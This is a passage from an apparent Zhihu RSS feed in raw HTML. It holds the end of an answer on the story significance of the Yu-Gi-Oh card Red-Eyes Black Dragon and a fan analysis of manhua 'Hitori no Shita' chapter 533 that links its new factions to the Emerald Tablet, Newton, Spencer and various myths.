data-private-watermark-src=\"v2-4f754c590e77042ff779f51d39208a98\"></p>\n<p>城之内被马利克洗脑进行的码头决斗时，表君用手札对换来尝试唤醒城之内。城之内残存的意识还记得自己的承诺，一定要到自己能成为独当一面的决斗者时，才能取回真红眼。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4bcd781376eec0f31f1556429e134f78_720w.jpg?rss\" data-rawwidth=\"2034\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4bcd781376eec0f31f1556429e134f78\" data-watermark-src=\"v2-f113a8cd8a74bd65dfda830b4a87d453\" data-private-watermark-src=\"v2-6e835710a90c7b1ecfbba4a5df64f23a\"></p>\n<p>这段剧情让真红眼成了2人羁绊的见证。并在之后的决斗城市准决赛上，真红眼在场上提升超魔导剑士攻击力，帮助王样战胜海马。</p>\n<p>小tips：其实在游戏王原作里，真红眼在王样手上的戏份比在城之内那还多些。因为整个决斗城市篇它都在王样卡组里，而决斗城市篇之后城之内也没有再决斗过了。</p>\n<p><br></p>\n<p>综上所述，一开始，真红眼黑龙这张卡的意义只是在剧情设定上的超高地位，但后续无论原作剧情还是动画原创的剧场版剧情，都在为其增添它的象征意义。到如今留在我们记忆里的真红眼黑龙，它就如同景山东坡的老歪脖子树，所携带的那些故事就已经让它充满了历史价值，本身故事设定的稀有度什么的反而不重要了。如同《真红眼黑龙》中所描绘的，卡片再稀有、再强大，终究只是卡片。决斗者最强大的武器，是自己的心。</p>\n<p><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ai-xie-71-25?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">艾叶</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/24348322/answer/1971729872?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">42 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/431039255?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问有类似心灵崩坏的游戏王卡片推荐一下吗？</a><br><a href=\"http://www.zhihu.com/question/444088245?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏王对战中，卡片不会成为卡片效果对象和不会被魔法陷阱怪兽效果影响这两个描述本质上有什么不同吗？</a><br>\n","link":"http://www.zhihu.com/question/24348322/answer/1971729872?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《一人之下》第533（566）话？","date":"2021-07-02 11:30:09","description":"\n<p>漫画533（566）话出现了许多新势力，从个人而言是开心的，这说明一人的格局并没有被完全被甲申之乱和三十六贼束缚；时至今日还在开辟新的世界；人外有人，天外有天；这才更像一个真实的世界；所以这里从个人角度来尝试着寻找一下这些世界势力的原型；</p>\n<blockquote>\n<i><b>观前提醒：</b>1，本文是以《一人之下》漫画和手游为基础做的简单整理；不涉及具体细节，如果对个别人物或剧情感兴趣；希望大家关注原版漫画与官方信息；</i><br><i>2，文中涉及的历史，符文以及各门派的简介，都是仅在一人之下世界观的语境下，结合个人浅薄的认识做的片面介绍；带有一定的主观倾向，目的仅是为了更好的解释个人观点，希望大家不要在现实生活中对号入座；</i> <br><i>3，文中出现的如：详情之类的字眼，目的是为了缩短篇幅，不代表观点一定正确；</i>\n</blockquote>\n<p><img src=\"https://pic4.zhimg.com/v2-55d320a66f7bb4ee4ebcf362c60e66ae_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"735\" data-rawheight=\"339\" data-watermark=\"watermark\" data-original-src=\"v2-55d320a66f7bb4ee4ebcf362c60e66ae\" data-watermark-src=\"v2-d269b95f035e43ad2174831b9c493427\" data-private-watermark-src=\"v2-43a44f8c14b7d89ab162d7f7e5f088d1\"></p>\n<p><i>如果有时间也可以先看之前做的漫画 </i>531（565）话之前世界异人的总结；</p>\n<a href=\"https://zhuanlan.zhihu.com/p/381719463\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-b68b2071ca06cb01c14181e72308f3b9_720w.jpg\" data-entity-type=\"article\" data-entity-data=\"null\" class=\"internal\">【一人之下】——世界异人汇总(截止漫画531话）</a><h2>目录</h2>\n<p><b>引子</b></p>\n<p><b>翡翠学会</b></p>\n<p>1.翠玉录</p>\n<p>2.牛顿</p>\n<p>3.斯宾塞</p>\n<p><b>大地之子</b></p>\n<p>1.盖亚</p>\n<p>2.那罗伽</p>\n<p>3.地母神</p>\n<p><b>异人馆</b></p>\n<p>1.九属会馆</p>\n<p>2.查侬</p>\n<p><b>石川流</b></p>\n<p>1.石川家</p>\n<p>2.妖刀蛭丸</p>\n<p><b>贝希摩斯</b></p>\n<p>1.贝希摩斯</p>\n<p>2.工业法器</p>\n<p>3.美国工会</p>\n<p><b>纳森岛</b></p>\n<p>1.阿方索</p>\n<p>2.纳森王</p>\n<p>3.投石问路</p>\n<p><b>个人想法</b></p>\n<p><br></p>\n<hr>\n<p><br></p>\n<h2>引子</h2>\n<p>漫画533（566）话出现了许多新势力，我们知道在中国有哪都通管理全国异人，那世界的其他地方，是什么样的组织在管理各方异人呢？虽然现在我们只了解到他们的名字，但是其实其中的许多名字都可以在现实世界中的世界传说和各国组织中找到一定的相似之处；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-99d1b90fef8afc45e57917b59929553d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"182\" data-watermark=\"watermark\" data-original-src=\"v2-99d1b90fef8afc45e57917b59929553d\" data-watermark-src=\"v2-2d79ff4b65d21566f78d5d279f663661\" data-private-watermark-src=\"\"></p>\n<h2><b>翡翠学会</b></h2>\n<p><b>1.翠玉录</b></p>\n<p>不出意外的话，这个翡翠学会的来源应该就是源自传说中的《翠玉录》；（overlord中雅儿贝德三姐妹的制作者的ID也是借鉴了这一原型。）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-822c348e1572cea26cd15e67a6bc5b8a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-822c348e1572cea26cd15e67a6bc5b8a\" data-watermark-src=\"v2-ef5958deabdd11be483090a355c70ed4\" data-private-watermark-src=\"\"></p>\n<p>那么为什么《翠玉录》在西方那么有名呢？传说西方炼金术起源自埃及。公元前1900年。埃及法老赫耳墨斯以及他传说中的父亲透特神以及赫尔墨斯的大儿子大祭祀塔特三代神明将所有炼金术的知识浓缩为13句话，雕刻在一块翠绿的祖母绿宝石板上，流传于人世。因此《翠玉录》也被称为翠玉十三章，这篇文字被认为是西方炼金术的源头和鼻祖；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7d70b9fe6f8ba8551e8972003a3120f9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"183\" data-watermark=\"watermark\" data-original-src=\"v2-7d70b9fe6f8ba8551e8972003a3120f9\" data-watermark-src=\"v2-522f2a0565a50e43b93f8cca1a50e891\" data-private-watermark-src=\"\"></p>\n<p>那么这《翠玉录》中究竟说了什么呢？这里列出一下这十三句话；「内容来源网络侵删」</p>\n<blockquote>作者：艾萨克·牛顿 名称：《翠玉录》 链接：<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E7%25BF%25A0%25E7%258E%2589%25E5%25BD%2595/4579712%3Ffr%3Daladdin\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">翠玉录（词语）_百度百科</a>\n</blockquote>\n<p>1. 真实不虚，永不说谎，必然带来真实： Tis true without lying, certain &amp; most true:</p>\n<p>2.下如同上，上如同下；依此成全太一的奇迹。 That which is below is like that which is above and that which is above is like that which is below to do ye miracles of one only thing.</p>\n<p><img src=\"https://pic4.zhimg.com/v2-58b8d6304a790d20bbf27e8168c4f82c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1368\" data-rawheight=\"291\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>3.万物本是太一，借由分化从太一创造出来。 And as all things have been and arose from one by ye mediation of one: so all things have their birth from this one thing by adaptation.</p>\n<p>4.太阳为父，月亮为母，从风孕育，从地养护。 The Sun is its father, the moon its mother, the wind hath carried it in its belly, the earth its nourse.</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f8b961b14317862800cf5c969ef445f7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1376\" data-rawheight=\"307\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>5.世间一切完美之源就在此处；其能力在地上最为完全。 The father of all perfection in ye whole world is here. Its force or power is entire if it be converted into earth.</p>\n<p>6.分土于火，萃精于糙，谨慎行之。 Separate thou ye earth from ye fire, ye subtile from the gross sweetly wth great indoustry.</p>\n<p><img src=\"https://pic3.zhimg.com/v2-452e645e879f66f710d2de25786324fe_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1369\" data-rawheight=\"340\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>7.从地升天，又从天而降，获得其上、其下之能力。 It ascends from ye earth to ye heaven &amp; again it desends to ye earth and receives ye force of things superior &amp; inferior.</p>\n<p>8.如此可得世界的荣耀、远离黑暗蒙昧。 By this means you shall have ye glory of ye whole world &amp; thereby all obscurity shall fly from you.</p>\n<p>9.此为万力之力，摧坚拔韧。 Its force is above all force, for it vanquishes every subtile thing &amp; penetrates every solid thing.</p>\n<p><img src=\"https://pic4.zhimg.com/v2-deed0e5111f61fb75f7db2ad64c35be6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1382\" data-rawheight=\"414\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>10.世界即如此创造。 So was ye world created.</p>\n<p>11.依此可达奇迹。 From this are &amp; do come admirable adaptations whereof ye process is here in this.</p>\n<p>12.我被称为三重伟大的赫尔墨斯，因我拥有世界三部分的智慧。 Hence I am called Hermes Trismegist, having the three parts of ye philosophy of ye whole world.</p>\n<p>13.这就是我所说的伟大工作。 That which I have said of ye operation of ye Sun is accomplished &amp; ended.</p>\n<p>以上就是英文版与中文版的《翠玉录》了（原文是拉丁文的），炼金术士认为太阳指的是不朽的精神，月亮指的是低层次的自我，是高我的投影。风是指灵性的生命力，地是指物质的躯体。炼金就是指神性与躯体的联合、精神和物质的统一；（信息来源于网络）如果这个解读角度合理的话，那这一点从和中国修炼中的性命双修其实也是异曲同工的；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1b78b5442e9ce51713fb675f6d84b8bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"660\" data-rawheight=\"191\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><b>2.牛顿</b></p>\n<p>在研究和解读《翠玉录》的人中，最有名的要数著名科学家艾萨克·牛顿了；传说上文引用的英文翻译就是他所做的；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-be2e55e5fa3b416ae8ffa60b286cc9ab_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"779\" data-rawheight=\"366\" data-watermark=\"watermark\" data-original-src=\"v2-be2e55e5fa3b416ae8ffa60b286cc9ab\" data-watermark-src=\"v2-0b368f26cc81c6f38cfbf827c85aecf4\" data-private-watermark-src=\"\"></p>\n<p>这位站立在巫术终结和科学兴起的历史转折点上的天才，通过对未知世界永无止境的探索，使他成为有史以来最伟大的科学家之一，也使他将自己一生中更多的精力花费在炼金术上，牛顿总共留下50多万英文单词的炼金术手稿和100多万单词的神学手稿，而这些工作与他的科学发现很难说是毫无关联的。值得注意的是塔伯院长与牛顿同名也叫艾萨克；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-379fbcbf8f9950c6140295ba763d09a6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"218\" data-watermark=\"watermark\" data-original-src=\"v2-379fbcbf8f9950c6140295ba763d09a6\" data-watermark-src=\"v2-24464dcdf2abdfc37df1bbbfe2e0bf06\" data-private-watermark-src=\"\"></p>\n<p>从之前的怀念画面也可以看出，弗拉梅尔学院和塔伯院长可能也曾隶属于欧洲翡翠学会；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-914b18a24c49ce0865032affa1e92e20_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"190\" data-watermark=\"watermark\" data-original-src=\"v2-914b18a24c49ce0865032affa1e92e20\" data-watermark-src=\"v2-c89b8b37d6217141e65e3d4b56e6b6bc\" data-private-watermark-src=\"\"></p>\n<p><b>3.斯宾塞</b></p>\n<p>这位欧洲翡翠学会的理事叫做威廉斯宾塞；威廉是一个非常常见的西方名字；而历史上也有一位比较著名的斯宾塞；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bef177f905feaa58d87b0df1ce44032f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"666\" data-rawheight=\"159\" data-watermark=\"watermark\" data-original-src=\"v2-bef177f905feaa58d87b0df1ce44032f\" data-watermark-src=\"v2-36a9bc65b675dd9c5091b8a4562fe1ba\" data-private-watermark-src=\"\"></p>\n<p>赫伯特·斯宾塞；英国哲学家、社会学家、教育家。他为人所共知的就是“社会达尔文主义之父”，所提出一套的学说把进化理论适者生存应用在社会学上尤其是教育及阶级斗争，是在理论上阐述进化论的英国哲学家先驱。也是艺术起源中游戏说的提出者（游戏说认为：艺术是天赋者内心剩余精力的发泄）；上期提到弗雷泽，这次提到斯宾塞，二叔难不成在研究艺术史？（个人猜想）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d01fa95a61de33b56d2edc6dc15db35e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"668\" data-rawheight=\"334\" data-watermark=\"watermark\" data-original-src=\"v2-d01fa95a61de33b56d2edc6dc15db35e\" data-watermark-src=\"v2-0583761f101e4514d12659d11ff398ac\" data-private-watermark-src=\"\"></p>\n<p>对了，斯宾塞认为：教育的目的和任务在于教导每一个人怎样去过“完美”的生活。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-93274408b1148217e8aa69e832be1de0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"666\" data-rawheight=\"153\" data-watermark=\"watermark\" data-original-src=\"v2-93274408b1148217e8aa69e832be1de0\" data-watermark-src=\"v2-84174332148a9b658743bb11d40655ca\" data-private-watermark-src=\"\"></p>\n<h2><b>大地之子</b></h2>\n<p>说实话，结合人种妆容服饰，这位莉莉娅会长以及她所在大地之子工会都没有太多的可以确定的东西；只能说个人感觉更接近南美或北非的服饰风格（个人猜测）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-05c620f5cf8bcb5570e3185e079d47de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-05c620f5cf8bcb5570e3185e079d47de\" data-watermark-src=\"v2-183738600455eac099cba3213058c2b3\" data-private-watermark-src=\"\"></p>\n<p><b>1.盖亚</b></p>\n<p>同样的，大地之子也并没有太多联想到的线索，如果有其他想法法朋友欢迎在评论区写出；非要说的话，北非南美宗教受希腊影响出现的盖亚崇拜可能与之有那么一点关联；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b39ff62096684d4180411a3d27eb4031_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"265\" data-watermark=\"watermark\" data-original-src=\"v2-b39ff62096684d4180411a3d27eb4031\" data-watermark-src=\"v2-39b2ae92c46435073ec77a097af9bc07\" data-private-watermark-src=\"\"></p>\n<p>盖亚：也是希腊神话中第一位超原始神明，她是大地的神格化，是第一位真正意义上的创世神，也是能创造生命的原始自然力之一（大地）。她的出现标志着混沌开始由无序转为有序，也标志着万物开始产生。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3caa769ea33b9b39244e59a088e4b0e9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"660\" data-rawheight=\"232\" data-watermark=\"watermark\" data-original-src=\"v2-3caa769ea33b9b39244e59a088e4b0e9\" data-watermark-src=\"v2-c8e44777b06eec8bc9dacc473d21d1fb\" data-private-watermark-src=\"\"></p>\n<p><b>2.那罗伽</b></p>\n<p>那罗伽是古印度神话中的阿修罗王，也曾被称为：大地之子。他曾将阿底提的耳环盗至其城堡钵罗耆阍奥提娑。后来，黑天受诸天神之托，杀死那罗伽，夺回此宝。而且在梵语中那罗伽被音译为地狱；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fba7c4727a8a97ff0e976d05185e9034_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1151\" data-rawheight=\"409\" data-watermark=\"watermark\" data-original-src=\"v2-fba7c4727a8a97ff0e976d05185e9034\" data-watermark-src=\"v2-13bf891748e55f62c3f37845b9e96aca\" data-private-watermark-src=\"v2-89092d03a30d4ba7b3bafed6ea332535\"></p>\n<p><b>3.地母神</b></p>\n<p>还有知友 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/cff24f1b490a04946b663b40a4584ee3\" data-hash=\"cff24f1b490a04946b663b40a4584ee3\" data-hovercard=\"p$b$cff24f1b490a04946b663b40a4584ee3\">@幻化千叶</a> 提到的：个人理解，大地之子应该是信仰地母神的女巫组织。莉莉娅女士的装扮有明显的吉普赛女巫的特色（头巾和略显浮夸的首饰）。地母神，亦称为大地之母或母神是指专司繁殖力及象征大地恩惠的女神，在这个范畴中并不是所有的女神都能被称呼为地母神。随着一神教的流行，地母神极其祭祀也逐渐沦为魔女或者女巫。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-94632f5746f373f8728301bdf3868f1e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"742\" data-rawheight=\"211\" data-watermark=\"watermark\" data-original-src=\"v2-94632f5746f373f8728301bdf3868f1e\" data-watermark-src=\"v2-7353ad236e55ad11b04de3b4a2a5a641\" data-private-watermark-src=\"v2-5f8faefb9925d4f6a5003325c937dfbf\"></p>\n<p>如果这里的巫女元素匹配，就和之前以利亚弄错的波曼可以相联结（不过波曼属于巫毒体系）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3389f7850e4bb51872774653509cd9cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"739\" data-rawheight=\"284\" data-watermark=\"watermark\" data-original-src=\"v2-3389f7850e4bb51872774653509cd9cd\" data-watermark-src=\"v2-8892881f519566a3a445b29ae57f3eee\" data-private-watermark-src=\"v2-1d2ada378130714191a976f74fa6aae4\"></p>\n<p>如果这里的大地之子不是个比喻句的话，那或许他们的官方也掌握着和节气谷纳森岛类似的仙踪；（个人猜测）</p>\n<h2>异人馆</h2>\n<p>在泰国，有很强的会馆文化，所谓会馆原本是指各地商户在外地互相帮扶的聚集地店；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-10962455d126d341a6d77c422ce0fe71_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-10962455d126d341a6d77c422ce0fe71\" data-watermark-src=\"v2-7ff93898e272fbd7bd09458514b055a8\" data-private-watermark-src=\"\"></p>\n<p><b>1.九属会馆</b></p>\n<p>泰国有九属会馆，九属是：潮州，客家，广府，福建，海南，云南，广西，浙江和台湾；九家会馆。一般是这些地方的华人后裔建立的，他们对中国的了解要比普通泰国人深入的多。但是其实也带有他们独特的视角和宗族理念。尤其是看待来泰国工作投资的中国人，就带有一定的利益连带关系。而与之相似的，所谓异人馆可能就是异人之间相互帮扶的机密组织吧；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b7624306035dae20d77c8fdd3a167cb3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"927\" data-rawheight=\"374\" data-watermark=\"watermark\" data-original-src=\"v2-b7624306035dae20d77c8fdd3a167cb3\" data-watermark-src=\"v2-fb6b827faf1f2d4758b1f49e185e5b0f\" data-private-watermark-src=\"\"></p>\n<p><b>2.查侬</b></p>\n<p>众所周知这个篇章是用来填坑的，世界上有那么多国家和地区；泰国能有如此待遇除了泰国本身丰富的历史文化外，更重要可能就是与之前出现的的关系；漫画344话比比肺活量中查侬的这一招应该是泰拳中的神猴腾空（ HakKung Ai-yara）这招出自一个泰国的神庙传说；是猴神曼加尔的法相显现；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8cbc94f7d6ab91fd060175f4442f3435_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"823\" data-rawheight=\"432\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>石川流</b></h2>\n<p>佛剑石川家所在的门派，之前已经介绍过几次他们的过去了，这里就不赘述了；目前已知下图左手是石川信的儿子，右边是日本异人组织的成员；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d4a02c659c0d5317812c73c7c7404990_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"306\" data-watermark=\"watermark\" data-original-src=\"v2-d4a02c659c0d5317812c73c7c7404990\" data-watermark-src=\"v2-13270685ffa18beac3a8a28c0bcb66f9\" data-private-watermark-src=\"\"></p>\n<p><b>1.石川流</b></p>\n<p>这次用的称呼不是石川家了而是石川流，因为这里女子的称呼是会长，说明石川信并不只是以家族或个人的身份来访，而是日本类似哪都通部门的会长；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e003e39bca229afe3dfeff7a89aaea6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"165\" data-watermark=\"watermark\" data-original-src=\"v2-7e003e39bca229afe3dfeff7a89aaea6\" data-watermark-src=\"v2-f582d396dacb905ec47d84fa67aa4b7c\" data-private-watermark-src=\"\"></p>\n<p><b>2.妖刀蛭丸</b></p>\n<p>另一方面，在说到纳森卫的承诺时，石川信说，和他们相似，这里应该就是指妖刀蛭丸；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-986597f6a9d5076ac3070e7f8d2c71fc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"280\" data-watermark=\"watermark\" data-original-src=\"v2-986597f6a9d5076ac3070e7f8d2c71fc\" data-watermark-src=\"v2-c2b2dafc80599599be28a84c05533bca\" data-private-watermark-src=\"\"></p>\n<p>结合上回所说的时代守护；那么蛭丸（蛭是一类生物的统称，以多营暂时性的体外寄生生活，以吸食其他动物的体液或血液为生。）这个名字漫画中对炼器和剑仙的解释；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c2ec44c23eff7d48d2b697bd5bee12f0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"227\" data-watermark=\"watermark\" data-original-src=\"v2-c2ec44c23eff7d48d2b697bd5bee12f0\" data-watermark-src=\"v2-77e2dae0d82f5d8b3d9e40f9e94f0068\" data-private-watermark-src=\"\"></p>\n<p>我觉得可能石川家之前已经世世代代用炁在喂养这把本寓意着不详的妖刀；甚至以及和漫画中的“家仙”一样成为了某种家族象征；（上周也提到过就不过多赘述了）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4c1e1cb4704f934490d8976581a99360_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"263\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>贝希摩斯</b></h2>\n<p>贝希摩斯，漫画中提到的一家新兴的美国公司，能用工业手段制造法器；服务遍布世界，虽然成立的时间不长，却有一定的野心；并且并未确定其是否完全代表美国异人（毕竟只是一家公司）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4d3d10b31ee234f0a1552dbf503b4d8e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"345\" data-watermark=\"watermark\" data-original-src=\"v2-4d3d10b31ee234f0a1552dbf503b4d8e\" data-watermark-src=\"v2-d696d5e1ec95d404948ac488b1272c8c\" data-private-watermark-src=\"\"></p>\n<p><b>1.贝希摩斯</b></p>\n<p>贝希摩斯（Behemoth）是在《圣经》中出现的怪物，传说上帝在创世纪第六天用粘土创造了贝希摩斯和利维坦，它的尾巴如杉木般挺直，肌肉如石头般结实，骨骼如铜铁般坚硬。在中世纪的时候他被恶魔诱惑加入了地狱的阵容。旧约解经书《米大示》称其为无敌的生物，只有耶和华的剑才能杀死它。而《次经》中提到“一饱口福”云云，当指末日的弥赛亚盛宴。那时巨兽和海魔将会大战，最后同归于尽，与巨鸟席兹一起成为圣洁者的食物。另有种说法它们都将被投入深渊。   （下图可以颠倒过来看）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2e5b453bbb68e0457db1fb5da8648995_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1184\" data-rawheight=\"682\" data-watermark=\"watermark\" data-original-src=\"v2-2e5b453bbb68e0457db1fb5da8648995\" data-watermark-src=\"v2-815be0e9ef037bc0bf54ac6578eee237\" data-private-watermark-src=\"\"></p>\n<p>但其实，抛开这些复杂的设定，贝希摩斯最直观的特点就是两个：巨大与贪婪；就和中国神话中的饕餮一样；二叔设定上的指代似乎也已经不言而喻了；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7034604529428c5faafb1fbad7250302_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"238\" data-watermark=\"watermark\" data-original-src=\"v2-7034604529428c5faafb1fbad7250302\" data-watermark-src=\"v2-609b80ebcf74dc1fff30836e80a4ea7d\" data-private-watermark-src=\"\"></p>\n<p><b>2.工业法器</b></p>\n<p>在漫画532话中出现了能够翻译常见语种的“助听器”，虽然我们都知道这个道具是为了解决漫画中的预言问题而设计出来的；这十有八九就是贝希摩斯的产品了；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-99a039edfcdd1bc213650a84dc6745cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"851\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-99a039edfcdd1bc213650a84dc6745cd\" data-watermark-src=\"v2-56a95684a65a6bbee23f52dc13244ab7\" data-private-watermark-src=\"\"></p>\n<p>但是注意四哥对这玩意的称呼：半个法器；这似乎也间接说明了贝希摩斯公司已经掌握了工业化打造法器的方法；如果法器可以批量制造，那按照之前的理论：对社会的威胁其实不小于神机百炼；或者反过来说，贝希摩斯有可能受到了神机百炼的协助，才得以批量制造法器（个人脑洞，点到即止）如此看来，在网上与二壮交手的也有可能是贝希摩斯的人；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-74366b8b81c662bbfe21d6662af75948_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"367\" data-watermark=\"watermark\" data-original-src=\"v2-74366b8b81c662bbfe21d6662af75948\" data-watermark-src=\"v2-0ea4024a1fc2d9ffa43f8fa0f2a9f430\" data-private-watermark-src=\"\"></p>\n<p>不过目前看来贝希摩斯对自己的技术把控的还是比较严格的，像下图三哥说的，法器用完还要还给他们；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-60bfb3440f55f169d5d97fca91e79f9e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"853\" data-rawheight=\"237\" data-watermark=\"watermark\" data-original-src=\"v2-60bfb3440f55f169d5d97fca91e79f9e\" data-watermark-src=\"v2-527bd461a9cbf5cc25e3656e14831a69\" data-private-watermark-src=\"\"></p>\n<p>可能就是有了制造生活法器的技术力和批量生产的生产力，贝希摩斯才敢于说自己是家世界公司（这个倒不至于吐槽老美，我们很多企业也已经有了这样的觉悟，全球化终究是必然趋势）可能正是这样的实力贝希摩斯才有底气说出：包括纳森岛吧。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5fc7f76cf3f9bc3b9a20ef16ff01bad7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"829\" data-rawheight=\"296\" data-watermark=\"watermark\" data-original-src=\"v2-5fc7f76cf3f9bc3b9a20ef16ff01bad7\" data-watermark-src=\"v2-43b7833242983496b90f94e6176e9e3a\" data-private-watermark-src=\"\"></p>\n<p>但这里凯勒没有说时态，如果纳森岛已经使用了贝希摩斯的技术那可能岛上的生活水平要比我们之前想象的要好；（毕竟纳森卫都穿的干干净净的）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ab0cf5e7685cc34b7f7b01ac77bc4f47_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"828\" data-rawheight=\"334\" data-watermark=\"watermark\" data-original-src=\"v2-ab0cf5e7685cc34b7f7b01ac77bc4f47\" 